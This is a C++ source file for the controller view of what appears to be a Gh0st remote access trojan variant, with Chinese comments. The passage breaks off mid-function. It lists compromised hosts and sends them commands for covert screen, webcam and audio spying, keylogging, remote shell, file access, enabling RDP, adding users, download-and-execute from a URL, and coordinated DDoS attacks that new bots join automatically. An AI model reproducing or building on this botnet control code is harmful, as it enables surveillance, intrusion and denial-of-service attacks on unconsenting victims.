// gh0stView.cpp : implementation of the CGh0stView class
//

#include "stdafx.h"
#include "gh0st.h"

#include "gh0stDoc.h"
#include "gh0stView.h"
#include "MainFrm.h"

#include "User.h"
#include "SettingsView.h"

#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "KeyBoardDlg.h"
#include "SystemDlg.h"
#include "ShellDlg.h"
#include "InputDlg.h"
#include "DDOSAttackDlg.h"
#include "BatchCommand.h"
#pragma comment(lib,"Winmm.lib")
#include "ChatDialog.h"
#include "PluginDlg.h"
#include "..\Server\WorkDll\macros.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CGh0stView* g_pConnectView;
extern CMainFrame* g_pFrame;
#define WM_MYINITIALUPDATE (WM_USER + 101)

extern CEventView* g_pEventView;

typedef struct
{
	char	*title;
	int		nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] = 
{
	{"  ID",			48	},
	{"外网IP",			100	},
	{"内网IP",			0	},
	{"计算机名/备注",	100	},
	{"操作系统",		70	},
	{"CPU核处理器",		80	},
	{"内存",            55  },
	{"速度",			50	},
	{"视频",			45	},
	{"开机时间",        100 },
	{"状态",            80  },
	{"地区",			120	},
	
};

int g_Column_Width = 0;
int	g_Column_Count = (sizeof(g_Column_Data) / 6) - !((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist;


/////////////////////////////////////////////////////////////////////////////
// CGh0stView

IMPLEMENT_DYNCREATE(CGh0stView, CListView)

BEGIN_MESSAGE_MAP(CGh0stView, CListView)
	//{{AFX_MSG_MAP(CGh0stView)
	ON_WM_SIZE()
	ON_WM_RBUTTONDOWN()
	ON_COMMAND(IDM_FILEMANAGER, OnFilemanager)
	ON_COMMAND(IDM_SCREENSPY, OnScreenspy)
	ON_COMMAND(IDM_DOWNEXEC, OnDownexec)
	ON_COMMAND(IDM_WEBCAM, OnWebcam)
	ON_COMMAND(IDM_REMOVE, OnRemove)
	ON_COMMAND(IDM_KEYBOARD, OnKeyboard)
	ON_COMMAND(IDM_SYSTEM, OnSystem)
	ON_COMMAND(IDM_REMOTESHELL, OnRemoteshell)
	ON_COMMAND(IDM_LOGOFF, OnLogoff)
	ON_COMMAND(IDM_REBOOT, OnReboot)
	ON_COMMAND(IDM_SHUTDOWN, OnShutdown)
	ON_COMMAND(IDM_SELECT_ALL, OnSelectAll)
	ON_COMMAND(IDM_UNSELECT_ALL, OnUnselectAll)
	ON_COMMAND(IDM_OPEN_URL_HIDE, OnOpenUrlHide)
	ON_COMMAND(IDM_OPEN_URL_SHOW, OnOpenUrlShow)
	ON_COMMAND(IDM_CLEANEVENT, OnCleanevent)
	ON_COMMAND(IDM_RENAME_REMARK, OnRenameRemark)
	ON_COMMAND(IDM_AUDIO_LISTEN, OnAudioListen)
	ON_COMMAND(IDM_DISCONNECT, OnDisconnect)
	ON_COMMAND(IDT_DDOSATTACK, OnDdosattack)
	ON_COMMAND(IDT_VEDIOSPY, OnVediospy)
	ON_COMMAND(IDT_SYSTEMMANAGER, OnSystemmanager)
	ON_COMMAND(IDT_SOUNDSPY, OnSoundspy)
	ON_COMMAND(IDT_KETBOADSPY, OnKetboadspy)
	ON_COMMAND(IDT_COMMANDSHELL, OnCommandshell)
	ON_COMMAND(IDT_FILEMANEGERS, OnFilemanegers)
	ON_COMMAND(IDM_BATCH, OnBatch)
	ON_COMMAND(IDM_DDOS, OnDdos)
	ON_COMMAND(IDM_REVERSE, OnReverse)
	ON_COMMAND(IDM_SELECT_XP, OnSelectXp)
	ON_COMMAND(IDM_SELECT_SERVER, OnSelectServer)
	ON_COMMAND(IDM_SELECT_WIN7, OnSelectWin7)
	ON_COMMAND(IDM_CUSTOM_SELECT, OnCustomSelect)
	ON_COMMAND(IDM_COUNTHOST, OnCounthost)
	ON_COMMAND(IDM_OPEN3389, OnOpen3389)
	ON_COMMAND(IDM_SENDMESSAGE, OnSendmessage)
	ON_COMMAND(IDM_PLUGIN, OnPlugin)
	ON_COMMAND(ID_opendaili, Onopendaili)
	ON_COMMAND(IDM_ADD_USER, OnAddUser)
	ON_COMMAND(IDT_SCREENSPY, OnScreenspy)
	ON_COMMAND(ID_open3389, OnOpenPort)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_MYINITIALUPDATE, OnMyInitialUpdate)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENPLUGINDIALOG, OnOpenPluginDialog)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CGh0stView construction/destruction

BOOL ReleaseGIF(LPSTR Path,LPCTSTR ResID,LPCTSTR ResDir);



UINT CGh0stView::CheckTime =0;

CGh0stView::CGh0stView()
{
	// TODO: add construction code here
	m_nCount = 0;
	m_AutoAttack = FALSE;

	if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
	{
		m_QQwry = new SEU_QQwry;
		m_QQwry->SetPath("QQWry.Dat");
	}


	((CGh0stApp *)AfxGetApp())->m_pConnectView = this;
	m_pListCtrl = NULL;
	m_AutoBacth=FALSE;
	m_AutoAttack =FALSE;
	m_BacthSize=0;

	//释放GIF
/*	ZeroMemory(szGifPath,MAX_PATH);
	GetCurrentDirectory(MAX_PATH,szGifPath);
	strcat(szGifPath,"\\bk.gif");
	ReleaseGIF(szGifPath,(LPCTSTR)IDR_BSS1,(LPCTSTR)"BSS");*/
	
	CheckTime = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "CheckTime",20);

	CloseHandle(CreateThread(NULL,NULL,CheckOnlineHost,this,NULL,NULL));
}

CGh0stView::~CGh0stView()
{
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView drawing

void CGh0stView::OnDraw(CDC* pDC)
{
	CGh0stDoc* pDoc = GetDocument();
	ASSERT_VALID(pDoc);
	// TODO: add draw code for native data here
}

void CGh0stView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();

	//////////////////////////////////////////////////////////////////////////
	NONCLIENTMETRICS ncm;
	memset(&ncm, 0, sizeof(NONCLIENTMETRICS));
	ncm.cbSize = sizeof(NONCLIENTMETRICS);
	
	VERIFY(::SystemParametersInfo(SPI_GETNONCLIENTMETRICS,
		sizeof(NONCLIENTMETRICS), &ncm, 0));
	ncm.lfMessageFont.lfWeight = 500;
	m_headerCtrl.m_HeaderFont.CreateFontIndirect(&ncm.lfMessageFont);
	SetFont(&(m_headerCtrl.m_HeaderFont));
	//////////////////////////////////////////////////////////////////////////

	m_pListCtrl = &GetListCtrl();
	
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	ListView_SetImageList(m_pListCtrl->m_hWnd, hImageListSmall, LVSIL_SMALL);

	//|LVS_EX_GRIDLINES
	m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_CHECKBOXES);

	for (int i = 0; i < g_Column_Count; i++)
	{
		m_pListCtrl->InsertColumn(i, g_Column_Data[i].title,LVCFMT_LEFT,g_Column_Data[i].nWidth);
	//	m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
		g_Column_Width += g_Column_Data[i].nWidth; // 总宽度
			m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_CHECKBOXES);
				m_pListCtrl->SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_HEADERDRAGDROP
		| LVS_EX_UNDERLINEHOT | LVS_EX_GRIDLINES);	//设置扩展风格 包括网格线等
	}

	// 设置数据段
	SetColumnNumeric(0);
	SetColumnNumeric(6);
	LVBKIMAGE bki;
     
	
	 if (m_pListCtrl->GetBkImage(&bki) && (bki.ulFlags == LVBKIF_SOURCE_NONE))
		  m_pListCtrl->SetBkImage(szGifPath,TRUE);

	 m_pListCtrl->SetTextBkColor(CLR_NONE);

	PostMessage(WM_MYINITIALUPDATE);
	// TODO: You may populate your ListView with items by directly accessing
	//  its list control through a call to GetListCtrl().
}

/////////////////////////////////////////////////////////////////////////////
// CGh0stView diagnostics

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CListView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() // non-debug version is inline
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif
/////////////////////////////////////////////////////////////////////////////
// CGh0stView message handlers

LRESULT CGh0stView::OnMyInitialUpdate(WPARAM, LPARAM)
{
	CGh0stView* pView = this;

	// Add Connects Window
	//((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Online Host", this, "Connections Users");


	/*
	// Add Settings Window
	CSettingsView* pSettingsView = new CSettingsView;
	((CWnd*)pSettingsView)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW,
		CRect(0,0,0,0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);

	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Config", pSettingsView, "Control Settings");
	
	*/

	// Add Build Window
	//对于CFormView派生类必须新生成对象而不能使用成员对象
	/*
	CBuildView *pBuildView = new CBuildView;
	//由于CFormView的成员受保护，所以必须对指针进行强制转换
	((CWnd*)pBuildView)->Create(NULL,NULL, WS_CHILD|WS_VISIBLE,CRect(0,210,400,400), pBuildView->GetActiveWindow(), 111 ,NULL);
	
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Create Server", pBuildView, "Build Server");
	*/

 	((CMainFrame*)AfxGetApp()->m_pMainWnd)->SetCurView(0);
	return 0;
}









LRESULT CGh0stView::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{
	
	ClientContext *pContext = (ClientContext *)lParam;

	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;

	return 0;
}

LRESULT CGh0stView::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;

	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}




LRESULT CGh0stView::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);

	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);

	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CGh0stView::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CGh0stView::OnOpenPluginDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CPluginDlg	*dlg = new CPluginDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_PLUGIN_DIALOG, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = PLUGIN_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


void CGh0stView::OnSize(UINT nType, int cx, int cy) 
{
	CListView::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	// OnSize 的时候m_pListCtrl还没有初始化
	if (m_pListCtrl == NULL)
		return;

 	CRect rcClient;
 	GetClientRect(rcClient);

	int	nClientWidth = rcClient.Width();
	int nIndex = g_Column_Count - 1;
	
	if (nClientWidth < g_Column_Width)
		return;
	
	m_pListCtrl->SetColumnWidth(nIndex, nClientWidth - g_Column_Width + g_Column_Data[nIndex].nWidth);	


 }

void CGh0stView::OnRButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CListView::OnRButtonDown(nFlags, point);
	
	CMenu	popup;
	popup.LoadMenu(IDR_LIST);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	int	count = pM->GetMenuItemCount();
	/*
	if (m_pListCtrl->GetSelectedCount() == 0)
	{
	
		for (int i = 0; i < count - 2; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
		}
		pM->EnableMenuItem(count - 1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	}
	*/
	
	// 全选
	/*
	if (m_pListCtrl->GetItemCount() > 0)
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_ENABLED);
	else
		pM->EnableMenuItem(count - 2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
	*/

	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);

}



LRESULT CGh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
{

	ClientContext	*pContext = (ClientContext *)lParam;

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText, strOS;
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		//if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
		//	return -1;

		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		///////////////////////////////////////////////////改变在线主机字体颜色//////////////////////////////////////////////////
		//m_pListCtrl->SetTextColor(RGB(255,0,0));   //红色显示
		m_pListCtrl->SetTextColor(RGB(237,96,61)); //橘色显示
		//m_pListCtrl->SetTextColor(RGB(0,100,255)); //蓝色显示
		//m_pListCtrl->SetTextColor(RGB(160,32,240));//紫色显示
		//m_pListCtrl->SetTextColor(RGB(246,45,244));//粉色显示
		//m_pListCtrl->SetTextColor(RGB(123,85,270));//棕色显示
		  m_pListCtrl->SetTextBkColor(-1); 

		
		// ID
		CString	str;
		str.Format("%d", m_nCount++);			
		// IP地址
		int i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		m_pListCtrl->SetItemText(i, 1, IPAddress);

		// 内网IP
		m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));

		// 主机名
		m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);

		// 系统

		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char *pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
			
		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
				pszOS = "NT";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "2000";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
				pszOS = "XP";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 )
				pszOS = "2003";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
				{
					pszOS = _T("Vista");  // Just Joking
				}
				else
				{
					pszOS = _T("2008");
				}
				
			}
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
			{
				if(LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					pszOS = _T("Win7");
                else
					pszOS = _T("2008 R2");
			}
			

		}
		strOS.Format
			(
			"%s SP%d",
			//OsVerInfo.szCSDVersion,
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber
			);
		m_pListCtrl->SetItemText(i, 4, strOS);

		// CPU
		str.Format("%u * %dMHz",LoginInfo->CPUNums, LoginInfo->CPUClockMhz);
		m_pListCtrl->SetItemText(i, 5, str);

		//Memory
		str.Format("%d MB",LoginInfo->MemorySize);
		m_pListCtrl->SetItemText(i,6,str);

		// Speed
 		str.Format("%d", LoginInfo->dwSpeed);
 		m_pListCtrl->SetItemText(i, 7, str);


		str = LoginInfo->bIsWebCam ? "有" : "--";
		m_pListCtrl->SetItemText(i, 8, str);

		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);
		
		// 运行时间
		str.Format("%s", LoginInfo->RunTime);
		m_pListCtrl->SetItemText(i, 9, str);

		m_pListCtrl->SetItemText(i,10,"空闲");
		
		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
		{

			str = m_QQwry->IPtoAdd(IPAddress);
			m_pListCtrl->SetItemText(i, 11, str);

			strToolTipsText += "\nArea: ";
			strToolTipsText += str;
//显示上线事件信息（如果不是重复上线）

CString Address;
Address.Format(_T("地理位置--%s"), str);
CString ShowEvent;
ShowEvent.Format(_T("客户Boy--%s 已经连接"),IPAddress,Address);
    g_pEventView->InsertItem(ShowEvent,0);//日志显示
}
else
{
m_pListCtrl->SetItemText(i, 11, "无纯真数据库");
//显示上线事件信息（如果不是重复上线）

CString ShowEvent;
ShowEvent.Format(_T("客户Boy--%s 已经连接"),IPAddress);
    g_pEventView->InsertItem(ShowEvent,1);//日志显示


} 



		m_pListCtrl->SetItemText(i,12,LoginInfo->szMark);
		
		// 指定唯一标识
		m_pListCtrl->SetItemData(i, (DWORD) pContext);
		
		g_pFrame->ShowConnectionsNumber();
	
		if (!((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
			g_pFrame->ShowToolTips(strToolTipsText);

		if(((CGh0stApp *)AfxGetApp())->m_bPalySound)//播放声音
				PlaySound(MAKEINTRESOURCE(IDR_WAVE2),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);

		SendAutoAttack(pContext);//新上线自动参与
		SendAutoBacthCommand(pContext);//新上线自动批量命令..

		////////////////////////////////////////////////////////////////////////////////////////重复上线问题
		int Tmpi=0;
		for( Tmpi = 0 ; Tmpi < nCnt ; Tmpi++ ){
			if( m_pListCtrl->GetItemText( nCnt , 1 ) == m_pListCtrl->GetItemText( Tmpi , 1 )){//先判断外网IP
				if( m_pListCtrl->GetItemText( nCnt , 2 ) == m_pListCtrl->GetItemText( Tmpi , 2 )){//再判断内网IP
					//				AfxMessageBox("有主机重复上线");
					m_pListCtrl->DeleteItem(Tmpi);
					g_pFrame->ShowConnectionsNumber();//更新目前的连接数
				}
			}
		}
//////////////////////////////////////////////////////////////////////////////////////////////////////

	}catch(...){}

	return 0;
}
	
LRESULT CGh0stView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	// 删除链表过程中可能会删除Context
	try
	{
		int nCnt = m_pListCtrl->GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)m_pListCtrl->GetItemData(i))
			{
			
//			if(m_pListCtrl->GetItemText(i, 0) == m_pListCtrl->GetItemText(nCnt , 0 ) && m_pListCtrl->GetItemText(i, 1) == m_pListCtrl->GetItemText(nCnt , 1 ) && nCnt !=1)
	//			{
					//AfxMessageBox("和ListView最后一栏外网ip一样，内网ip也一样，重复上线了");
		//			break;
	//			}
	//			else
	//			{
					CString strText;
					strText.Format("客户[ %s - %s - %s ]已经离线",
						m_pListCtrl->GetItemText(i, 0),
						m_pListCtrl->GetItemText(i, 2),
						m_pListCtrl->GetItemText(i, 3));
				    	g_pEventView->InsertItem(strText,1);//日志显示
					/************************************/
				m_pListCtrl->DeleteItem(i);
				if(((CGh0stApp *)AfxGetApp())->m_bPalySound)//播放声音
				PlaySound(MAKEINTRESOURCE(IDR_WAVE1),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
				break;
	//		}		

		}
		}

		// 关闭相关窗口

		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
		case SCREENSPY_DLG:
		case WEBCAM_DLG:
		case AUDIO_DLG:
		case KEYBOARD_DLG:
		case SYSTEM_DLG:
		case SHELL_DLG:
		case PLUGIN_DLG:
			//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
			break;
		default:
			break;
		}
	}catch(...){}


	// 更新当前连接总数
	g_pFrame->ShowConnectionsNumber();
	return 0;
}


void CGh0stView::SendChatCommand(PBYTE pData, UINT nSize)
{
	INT Count =m_pListCtrl->GetItemCount();
	for (int i=0;i<Count;i++)
	{
		if(m_pListCtrl->GetCheck(i))
		{
			ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
			// 发送获得驱动器列表数据包
			m_iocpServer->Send(pContext, pData, nSize);
		}
	}
}

void CGh0stView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	// TODO: Add your command handler code here
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(nItem);
		// 发送获得驱动器列表数据包
		m_iocpServer->Send(pContext, pData, nSize);

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
	
}

WORD CGh0stView::SendDDostStopCommand(WORD iTaskID)
{
	DWORD iCount = m_pListCtrl->GetItemCount();
	WORD Count =0;
	CHAR szStatus[500]={NULL};
	
	CHAR szTask[20]={NULL};
	wsprintf(szTask,"任务 %d",iTaskID);
	
	BYTE pData[2]={COMMAND_DDOS_STOP,0};
	
	//停止掉自动
	if(iTaskID == m_AutoTask)
		m_AutoAttack = FALSE;

	for (DWORD i=0;i<iCount;i++) 
	{
		//检查主机是否空闲状态
		m_pListCtrl->GetItemText(i,10,szStatus,500);
		if(strcmp(szStatus,szTask)==0)
		{
			ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
			// 发送DDOS 攻击命令
			m_iocpServer->Send(pContext, &pData[0], 2);
			Count++;
			m_pListCtrl->SetItemText(i,10,"空闲");
		}
	}
	return Count;
}

VOID CGh0stView::SendAutoAttack(ClientContext *Context)
{
	if(m_AutoAttack == FALSE)
		return;

	WORD nSize = sizeof(ATTACK);
	
	LPBYTE pData = new BYTE[nSize+1];
	

	pData[0]=COMMAND_DDOS_ATTACK;//命令消息..
	ATTACK m_Send;
	memcpy(&m_Send,&m_AutoAttackData,nSize);
	
	memcpy(pData+1,&m_Send,nSize);	
	
	m_iocpServer->Send(Context, pData, nSize+1);
	
	DWORD iCount = m_pListCtrl->GetItemCount();
	char StrShow[20]={NULL};
	wsprintf(StrShow,"任务 %d",m_AutoTask);

	m_pListCtrl->SetItemText(iCount-1,10,StrShow);

	delete pData;
}

WORD CGh0stView::SendDDosAttackCommand(LPATTACK m_Attack,INT HostNums,BOOL AutoAttack,WORD iTaskID)
{	
	DWORD iCount = m_pListCtrl->GetItemCount();
	
	WORD nSize = sizeof(ATTACK);

	LPBYTE pData = new BYTE[nSize+1];
	
	pData[0]=COMMAND_DDOS_ATTACK;//命令消息..
	ATTACK m_Send;
	memcpy(&m_Send,m_Attack,nSize);

	memcpy(pData+1,&m_Send,nSize);
	

	WORD Count = 0;
	CHAR szStatus[500]={NULL};
	CHAR szTask[20]={NULL};
	wsprintf(szTask,"任务 %d",iTaskID);

	//说明是选中主机
	if(HostNums==-1)
	{
		for (DWORD i=0;i<iCount;i++) 
		{
			if(m_pListCtrl->GetCheck(i))
			{
				//检查主机是否空闲状态
				m_pListCtrl->GetItemText(i,10,szStatus,500);
				if(strcmp(szStatus,"空闲")==0)
				{
					ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
					// 发送DDOS 攻击命令
					m_iocpServer->Send(pContext, pData, nSize+1);
					Count++;
					m_pListCtrl->SetItemText(i,10,szTask);
				}
			}
		}
	}
	else
	{
		if(iCount<HostNums)
			HostNums = iCount;
		
		for (DWORD i=0;i<HostNums;i++)
		{
			//检查主机是否空闲状态
			m_pListCtrl->GetItemText(i,10,szStatus,500);
			if(strcmp(szStatus,"空闲")==0)
			{
				ClientContext* pContext = (ClientContext*)m_pListCtrl->GetItemData(i);
				// 发送DDOS 攻击命令
				m_iocpServer->Send(pContext, pData, nSize+1);
				Count++;
				m_pListCtrl->SetItemText(i,10,szTask);
			}
		}
	}
	delete []pData;

	if(AutoAttack)
	{
		m_AutoAttack = TRUE;
		m_AutoTask = iTaskID;
		memcpy(&m_AutoAttackData,m_Attack,sizeof(ATTACK));
	}

	return Count;
}



void CGh0stView::OnFilemanager()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnScreenspy() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CGh0stView::OnWebcam() 
{
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CGh0stView::OnAudioListen() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CGh0stView::OnDownexec() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


void CGh0stView::OnRemove() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认卸载服务端吗 -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
